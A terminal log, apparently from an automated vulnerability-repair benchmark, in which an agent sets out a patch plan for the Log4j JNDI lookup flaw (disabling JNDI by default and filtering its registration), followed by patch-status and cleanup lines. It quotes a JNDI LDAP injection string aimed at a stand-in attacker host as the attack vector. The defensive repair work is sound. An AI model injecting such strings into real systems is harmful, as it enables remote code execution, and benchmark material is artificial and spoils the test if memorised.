[2;36m                    [0m         [39mprotocols.[0m                                                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Attack vector**: An attacker can inject `$[0m[1;39m{[0m[39mjndi:ldap:[0m[35m/[0m[35m/attacker.com/[0m[95mEvil[0m[1;39m}[0m[39m` [0m    [2m                [0m
[2;36m                    [0m         [39minto any logged message, which gets processed through:[0m                              [2m                [0m
[2;36m                    [0m         [39m   - MessagePatternConverter → StrSubstitutor → Interpolator → JndiLookup → Remote [0m [2m                [0m
[2;36m                    [0m         [39mJNDI access → RCE[0m                                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Critical Observation[0m                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mUnlike all other lookup implementations [0m[1;39m([0m[39mSystemPropertiesLookup, EnvironmentLookup,[0m [2m                [0m
[2;36m                    [0m         [39mMapLookup, DateLookup[0m[1;39m)[0m[39m, which only access local resources, JndiLookup is unique in [0m [2m                [0m
[2;36m                    [0m         [39mallowing remote network access. This makes it fundamentally dangerous and [0m          [2m                [0m
[2;36m                    [0m         [39munsuitable for default enablement.[0m                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Comprehensive Fix Strategy[0m                                                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Primary Fix: Disable JNDI by Default with Property-Based Configuration[0m          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**File: `core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`**[0m [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Location: Line [0m[1;36m31[0m[39m**[0m                                                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Change:**[0m                                                                         [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[35m/[0m[39m FROM:[0m                                                                            [2m                [0m
[2;36m                    [0m         [39mprivate static boolean ENABLE_JNDI = true;[0m                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[35m/[0m[39m TO:[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mprivate static boolean ENABLE_JNDI = [0m[1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m                 [2m                [0m
[2;36m                    [0m         [39m    [0m[1;35m.getBooleanProperty[0m[1;39m([0m[32m"log4j2.enableJndi"[0m[39m, false[0m[1;39m)[0m[39m;[0m                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Rationale:**[0m                                                                      [2m                [0m
[2;36m                    [0m         [39m- Sets secure default [0m[1;39m([0m[39m`false`[0m[1;39m)[0m[39m preventing exploitation out-of-the-box[0m              [2m                [0m
[2;36m                    [0m         [39m- Integrates with Log4j's existing property configuration system[0m                    [2m                [0m
[2;36m                    [0m         [39m- Allows explicit opt-in via system property: `-Dlog4j2.[0m[33menableJndi[0m[39m=[0m[35mtrue[0m[39m`[0m            [2m                [0m
[2;36m                    [0m         [39m- Maintains backward compatibility for legitimate use cases[0m                         [2m                [0m
[2;36m                    [0m         [39m- Follows defense-in-depth principle[0m                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Secondary Fix: Conditional JNDI Registration in Interpolator[0m                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**File: [0m                                                                            [2m                [0m
[2;36m                    [0m         [39m`core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java`**[0m       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Location [0m[1;36m1[0m[39m: Default constructor [0m[1;39m([0m[39mlines [0m[1;36m62[0m[39m-[0m[1;36m67[0m[1;39m)[0m[39m**[0m                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Change:**[0m                                                                         [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[35m/[0m[39m FROM:[0m                                                                            [2m                [0m
[2;36m                    [0m         [39mpublic [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [39m    this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m              [2m                [0m
[2;36m                    [0m         [39m    [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [39m    [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                    [2m                [0m
[2;36m                    [0m         [39m    [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                          [2m                [0m
[2;36m                    [0m         [1;39m}[0m                                                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[35m/[0m[39m TO:[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mpublic [0m[1;35mInterpolator[0m[1;39m([0m[1;39m)[0m[39m [0m[1;39m{[0m                                                             [2m                [0m
[2;36m                    [0m         [39m    this.defaultLookup = new [0m[1;35mMapLookup[0m[1;39m([0m[39mnew HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m              [2m                [0m
[2;36m                    [0m         [39m    [0m[1;35mlookups.put[0m[1;39m([0m[32m"sys"[0m[39m, new [0m[1;35mSystemPropertiesLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [39m    [0m[1;35mlookups.put[0m[1;39m([0m[32m"env"[0m[39m, new [0m[1;35mEnvironmentLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                    [2m                [0m
[2;36m                    [0m         [39m    [0m[35m/[0m[35m/[0m[39m Only register JNDI lookup if explicitly enabled[0m                              [2m                [0m
[2;36m                    [0m         [39m    if [0m[1;39m([0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                [2m                [0m
[2;36m                    [0m         [39m        [0m[1;35mlookups.put[0m[1;39m([0m[32m"jndi"[0m[39m, new [0m[1;35mJndiLookup[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;39m}[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Location [0m[1;36m2[0m[39m: Plugin-based constructor [0m[1;39m([0m[39mlines [0m[1;36m48[0m[39m-[0m[1;36m56[0m[1;39m)[0m[39m**[0m                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Change:**[0m                                                                         [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [35m/[0m[35m/[0m[39m Add filtering logic inside the loop:[0m                                             [2m                [0m
[2;36m                    [0m         [39mfor [0m[1;39m([0m[39mfinal Map.Entry<String, PluginType> entry : [0m[1;35mplugins.entrySet[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m              [2m                [0m
[2;36m                    [0m         [39m    @[0m[1;35mSuppressWarnings[0m[1;39m([0m[32m"unchecked"[0m[1;39m)[0m                                                  [2m                [0m
[2;36m                    [0m         [39m    final Class<StrLookup> clazz = [0m[1;35mentry.getValue[0m[1;39m([0m[1;39m)[0m[1;35m.getPluginClass[0m[1;39m([0m[1;39m)[0m[39m;[0m               [2m                [0m
[2;36m                    [0m         [39m    try [0m[1;39m{[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m        [0m[35m/[0m[35m/[0m[39m Skip JndiLookup if JNDI is not explicitly enabled[0m                        [2m                [0m
[2;36m                    [0m         [39m        if [0m[1;39m([0m[32m"jndi"[0m[1;35m.equals[0m[1;39m([0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m && ![0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m          [2m                [0m
[2;36m                    [0m         [39m            continue;[0m                                                               [2m                [0m
[2;36m                    [0m         [39m        [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [39m        [0m[1;35mlookups.put[0m[1;39m([0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, [0m[1;35mclazz.newInstance[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m[39m catch [0m[1;39m([0m[39mfinal Exception ex[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                  [2m                [0m
[2;36m                    [0m         [39m        [0m[1;35mLOGGER.error[0m[1;39m([0m[32m"Unable to create Lookup for "[0m[39m + [0m[1;35mentry.getKey[0m[1;39m([0m[1;39m)[0m[39m, ex[0m[1;39m)[0m[39m;[0m          [2m                [0m
[2;36m                    [0m         [39m    [0m[1;39m}[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;39m}[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Rationale:**[0m                                                                      [2m                [0m
[2;36m                    [0m         [39m- Prevents JNDI lookup registration at the Interpolator level[0m                       [2m                [0m
[2;36m                    [0m         [39m- Provides second layer of defense [0m[1;39m([0m[39mdefense-in-depth[0m[1;39m)[0m                               [2m                [0m
[2;36m                    [0m         [39m- Handles both manual registration and plugin discovery paths[0m                       [2m                [0m
[2;36m                    [0m         [39m- Consistent behavior across all Interpolator instantiation methods[0m                 [2m                [0m
[2;36m                    [0m         [39m- Maintains existing behavior for safe lookups [0m[1;39m([0m[39msys, env, etc.[0m[1;39m)[0m                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Additional Required Changes[0m                                                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**File: `core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java`**[0m [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Required Import Addition [0m[1;39m([0m[39mnear line [0m[1;36m17[0m[39m-[0m[1;36m23[0m[1;39m)[0m[39m:**[0m                                     [2m                [0m
[2;36m                    [0m         [39m```java[0m                                                                             [2m                [0m
[2;36m                    [0m         [39mimport org.apache.logging.log4j.util.PropertiesUtil;[0m                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThis import is necessary to access the property configuration system.[0m               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m## Justification and Impact Analysis[0m                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Why This is the Optimal Approach[0m                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **Secure by Default**: JNDI is disabled unless explicitly enabled, eliminating [0m  [2m                [0m
[2;36m                    [0m         [39mthe vulnerability for all default configurations.[0m                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **Minimal Code Changes**: Only requires modifications to [0m[1;36m2[0m[39m files [0m                [2m                [0m
[2;36m                    [0m         [1;39m([0m[39mJndiLookup.java and Interpolator.java[0m[1;39m)[0m[39m, reducing risk of introducing new bugs.[0m     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **Preserves Existing Functionality**: Applications that legitimately need JNDI [0m  [2m                [0m
[2;36m                    [0m         [39mlookups can enable them via system property or programmatic API.[0m                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m. **Defense in Depth**: Multiple checkpoints [0m[1;39m([0m[39mJndiLookup flag check + Interpolator[0m [2m                [0m
[2;36m                    [0m         [39mregistration filtering[0m[1;39m)[0m[39m provide redundant security.[0m                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m. **Backward Compatible**: Existing code using `[0m[1;35mJndiLookup.setEnableJndi[0m[1;39m([0m[39mtrue[0m[1;39m)[0m[39m` [0m   [2m                [0m
[2;36m                    [0m         [39mcontinues to work.[0m                                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m. **Consistent with Codebase Patterns**: Uses existing PropertiesUtil [0m             [2m                [0m
[2;36m                    [0m         [39minfrastructure and follows Log4j's configuration conventions.[0m                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m. **No Breaking Changes to Tests**: Existing tests already check [0m                  [2m                [0m
[2;36m                    [0m         [39m`[0m[1;35mJndiLookup.isEnableJndi[0m[1;39m([0m[1;39m)[0m[39m` and skip if disabled, so they'll adapt automatically.[0m   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### How It Addresses the Evaluation Report[0m                                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- **Blocks Remote JNDI Lookups**: With JNDI disabled by default, [0m                   [2m                [0m
[2;36m                    [0m         [39m`$[0m[1;39m{[0m[39mjndi:ldap:[0m[35m/[0m[35m/[0m[95m...[0m[1;39m}[0m[39m` patterns in log messages return null instead of executing [0m     [2m                [0m
[2;36m                    [0m         [39mremote lookups.[0m                                                                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- **Prevents RCE**: The attack vector is completely blocked since JndiLookup won't [0m [2m                [0m
[2;36m                    [0m         [39mbe registered in the Interpolator.[0m                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- **Maintains Log Processing**: All other aspects of log processing continue [0m       [2m                [0m
[2;36m                    [0m         [39mnormally; only JNDI-specific lookups are affected.[0m                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- **No Harness Modification**: The fix is entirely in the source code, not the [0m     [2m                [0m
[2;36m                    [0m         [39mfuzzing harness.[0m                                                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Preserved Logic[0m                                                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- **Other Lookups**: SystemPropertiesLookup, EnvironmentLookup, MapLookup, [0m         [2m                [0m
[2;36m                    [0m         [39mDateLookup, and all other safe lookups continue functioning normally.[0m               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- **Message Formatting**: The entire pattern layout and message formatting pipeline[0m [2m                [0m
[2;36m                    [0m         [39mremains unchanged.[0m                                                                  [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- **Variable Substitution**: The StrSubstitutor continues to work for all non-JNDI [0m [2m                [0m
[2;36m                    [0m         [39mlookups.[0m                                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m- **Configuration System**: BaseConfiguration's initialization and StrSubstitutor [0m  [2m                [0m
[2;36m                    [0m         [39msetup remain the same.[0m                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Potential Side Effects and Mitigation[0m                                           [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Side Effect [0m[1;36m1[0m[39m: Applications Using JNDI Lookups Will Break**[0m                       [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m*Mitigation:*[0m                                                                       [2m                [0m
[2;36m                    [0m         [39m- Clear documentation explaining the change and security rationale[0m                  [2m                [0m
[2;36m                    [0m         [39m- Migration guide showing how to re-enable: `-Dlog4j2.[0m[33menableJndi[0m[39m=[0m[35mtrue[0m[39m`[0m              [2m                [0m
[2;36m                    [0m         [39m- Security warning in documentation about RCE risks[0m                                 [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Side Effect [0m[1;36m2[0m[39m: Tests Expecting JNDI May Fail**[0m                                    [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m*Mitigation:*[0m                                                                       [2m                [0m
[2;36m                    [0m         [39m- Existing tests already check `[0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m` and skip if disabled[0m                [2m                [0m
[2;36m                    [0m         [39m- Test setup can explicitly enable JNDI: `[0m[1;35mJndiLookup.setEnableJndi[0m[1;39m([0m[39mtrue[0m[1;39m)[0m[39m`[0m           [2m                [0m
[2;36m                    [0m         [39m- Add new tests verifying JNDI is disabled by default[0m                               [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m**Side Effect [0m[1;36m3[0m[39m: Plugin Discovery Still Finds JndiLookup**[0m                          [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m*Mitigation:*[0m                                                                       [2m                [0m
[2;36m                    [0m         [39m- The filtering logic in Interpolator's plugin-based constructor handles this[0m       [2m                [0m
[2;36m                    [0m         [39m- Even if discovered, JndiLookup won't be registered if disabled[0m                    [2m                [0m
[2;36m                    [0m         [39m- This is intentional to support opt-in scenarios[0m                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Similar Solutions in Codebase[0m                                                   [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe property-based configuration pattern is used throughout Log4j:[0m                  [2m                [0m
[2;36m                    [0m         [39m- `Constants.jav[0m[1;92ma:46[0m[39m` shows `[0m[1;35mPropertiesUtil.getProperties[0m[1;39m([0m[1;39m)[0m[1;35m.getStringProperty[0m[1;39m([0m[1;39m)[0m[39m` [0m   [2m                [0m
[2;36m                    [0m         [39musage[0m                                                                               [2m                [0m
[2;36m                    [0m         [39m- Other components use similar boolean property checks[0m                              [2m                [0m
[2;36m                    [0m         [39m- The pattern of checking flags before instantiation is consistent with Log4j [0m      [2m                [0m
[2;36m                    [0m         [39mdesign[0m                                                                              [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Test Impact[0m                                                                     [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe fix requires minimal test modifications:[0m                                        [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m. **JndiLookupTest.java**: Already checks `[0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m` [0m[1;39m([0m[39mline [0m[1;36m53[0m[39m-[0m[1;36m55[0m[1;39m)[0m[39m, will skip[0m [2m                [0m
[2;36m                    [0m         [39mtests by default[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m. **InterpolatorTest.java**: Already checks `[0m[1;35misEnableJndi[0m[1;39m([0m[1;39m)[0m[39m` [0m[1;39m([0m[39mlines [0m[1;36m65[0m[39m-[0m[1;36m67[0m[39m, [0m[1;36m89[0m[39m-[0m[1;36m91[0m[1;39m)[0m[39m,[0m [2m                [0m
[2;36m                    [0m         [39mwill skip JNDI tests[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m. **New Test Needed**: Verify JNDI is disabled by default and can be enabled via [0m  [2m                [0m
[2;36m                    [0m         [39mproperty[0m                                                                            [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m### Security Posture[0m                                                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThis fix transforms Log4j from:[0m                                                     [2m                [0m
[2;36m                    [0m         [39m- **Vulnerable by Default** → **Secure by Default**[0m                                 [2m                [0m
[2;36m                    [0m         [39m- **Implicit Trust** → **Explicit Opt-In**[0m                                          [2m                [0m
[2;36m                    [0m         [39m- **Single Point of Failure** → **Defense in Depth**[0m                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39mThe vulnerability is completely neutralized while maintaining flexibility for [0m      [2m                [0m
[2;36m                    [0m         [39mlegitimate use cases through explicit configuration.[0m                                [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m                                                                                             [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mfix_strategy[0m[1m>[0m                                                                     [2m                [0m
[2;36m                    [0m         ===Evaluation [33mEnd[0m===                                                                [2m                [0m
[2;36m[01/10/26 06:43:58][0m[2;36m [0m[34mINFO    [0m Prism Supervisor Routing: TeamStatus.EVALUATE -> TeamStatus.END                      ]8;id=769751;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=339660;file:///home/qqor/crete/packages/crete/framework/agent/services/prism/__init__.py#160\[2m160[0m]8;;\
[2;36m                    [0m         [1m([0mn evals: [1;36m2[0m, patch status: PatchStatus.SOUND[1m)[0m                                        [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Building environment                                                                 ]8;id=899914;file:///home/qqor/crete/packages/crete/framework/context_builder/services/aixcc/__init__.py\[2m__init__.py[0m]8;;\[2m:[0m]8;id=495301;file:///home/qqor/crete/packages/crete/framework/context_builder/services/aixcc/__init__.py#132\[2m132[0m]8;;\
[2;36m                    [0m         - Cache directory: [35m/tmp/[0m[95mtmpzpi71n2l[0m                                                  [2m               [0m
[2;36m                    [0m         - Max timeout: [1;36m1800[0m                                                                  [2m               [0m
[2;36m                    [0m         - Output directory:                                                                  [2m               [0m
[2;36m                    [0m         [35m/home/qqor/crete/reports/prism.prism_claude_sonnet_4_5/log4j2_log4j2-delta-01_vuln_0[0m [2m               [0m
[2;36m                    [0m         [35m/[0m[95magent-output-1768027438.2971005[0m                                                     [2m               [0m
[2;36m                    [0m         - Detection toml file:                                                               [2m               [0m
[2;36m                    [0m         scripts/benchmark/afc-delta-full/log4j2_log4j2-delta-01_vuln_0.toml                  [2m               [0m
[2;36m                    [0m         - Challenge project directory: [35m/home/qqor/crete/.cache/[0m[95mofficial-afc-logging-log4j2[0m   [2m               [0m
[2;36m                    [0m                                                                                              [2m               [0m
[2;36m[01/10/26 06:44:00][0m[2;36m [0m[34mINFO    [0m Deleting environments directory: [35m/home/qqor/crete/.cache/environments/[0m[95mlog4j2[0m         ]8;id=442053;file:///home/qqor/crete/scripts/benchmark/__main__.py\[2m__main__.py[0m]8;;\[2m:[0m]8;id=216052;file:///home/qqor/crete/scripts/benchmark/__main__.py#300\[2m300[0m]8;;\
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Deleted work directory:                                                              ]8;id=113199;file:///home/qqor/crete/scripts/benchmark/__main__.py\[2m__main__.py[0m]8;;\[2m:[0m]8;id=848462;file:///home/qqor/crete/scripts/benchmark/__main__.py#314\[2m314[0m]8;;\
[2;36m                    [0m         [35m/home/qqor/crete/packages/python_oss_fuzz/.oss_fuzz/build/work/[0m[95mlog4j2[0m                [2m               [0m
[2;36m                   [0m[2;36m [0m[34mINFO    [0m Deleted out directory:                                                               ]8;id=737679;file:///home/qqor/crete/scripts/benchmark/__main__.py\[2m__main__.py[0m]8;;\[2m:[0m]8;id=238295;file:///home/qqor/crete/scripts/benchmark/__main__.py#321\[2m321[0m]8;;\
[2;36m                    [0m         [35m/home/qqor/crete/packages/python_oss_fuzz/.oss_fuzz/build/out/[0m[95mlog4j2[0m                 [2m               [0m
